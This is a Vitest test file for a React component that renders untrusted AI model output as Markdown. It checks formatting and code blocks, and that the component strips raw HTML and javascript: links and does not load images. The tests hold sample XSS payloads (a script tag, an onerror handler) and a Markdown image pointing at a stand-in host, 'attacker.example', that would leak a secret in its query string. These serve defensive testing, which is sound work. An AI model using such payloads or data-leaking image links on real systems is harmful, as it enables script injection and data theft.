/**
 * Safety tests for rendering untrusted model output. Uses server-side rendering to static
 * HTML, so no DOM library is needed.
 */
import { renderToStaticMarkup } from 'react-dom/server';
import { describe, expect, it } from 'vitest';
import { ChatMarkdown } from './ChatMarkdown';

const render = (text: string) => renderToStaticMarkup(<ChatMarkdown text={text} />);

describe('ChatMarkdown', () => {
  it('renders Markdown formatting', () => {
    const html = render('**bold** and `inline`\n\n- one\n- two');
    expect(html).toContain('<strong>bold</strong>');
    expect(html).toContain('<code');
    expect(html).toContain('<li>one</li>');
  });

  it('syntax-highlights fenced code blocks with a language', () => {
    const html = render('```ts\nconst x: number = 1;\n```');
    expect(html).toContain('const');
    expect(html).not.toContain('```');
    expect(html).not.toMatch(/<pre[^>]*><pre/); // no nested pre
  });

  it('renders fenced code without a language as a plain block', () => {
    expect(render('```\nline 1\nline 2\n```')).toMatch(
      /<pre[^>]*><code>line 1\nline 2<\/code><\/pre>/,
    );
  });

  it('never renders raw HTML from the model', () => {
    const html = render('<script>alert(1)</script><img src=x onerror="alert(2)"><b>hi</b>');
    expect(html).not.toContain('<script');
    expect(html).not.toContain('onerror');
    expect(html).not.toContain('<b>');
  });

  it('does not load images (data-exfiltration vector), showing alt text instead', () => {
    const html = render('![chart](https://attacker.example/pixel.png?q=secret)');
    expect(html).not.toContain('<img');
    expect(html).not.toContain('attacker.example');
    expect(html).toContain('[image: chart]');
  });

  it('strips javascript: URLs and opens safe links without opener/referrer', () => {
    const unsafe = render('[click](javascript:alert(1))');
    expect(unsafe).not.toContain('javascript:');

    const safe = render('[docs](https://example.com)');
    expect(safe).toContain('href="https://example.com"');
    expect(safe).toContain('rel="noopener noreferrer nofollow"');
    expect(safe).toContain('target="_blank"');
  });
});
